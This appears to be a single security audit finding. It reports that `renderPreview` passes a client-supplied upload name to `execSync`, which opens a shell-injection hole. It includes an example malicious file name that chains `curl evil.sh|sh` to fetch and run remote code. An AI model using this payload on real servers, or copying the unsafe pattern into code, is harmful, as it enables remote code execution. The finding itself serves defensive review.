name: doubted-security-injection

finding.title: `renderPreview` runs the upload's name through a shell
finding.description: `execSync` runs its string through a shell, and `source` holds `uploadName` as given. The upload route in `src/routes/upload.ts` passes the client's original file name, so a file named `a.pdf;curl evil.sh|sh` runs that command on the server with the service's permissions.
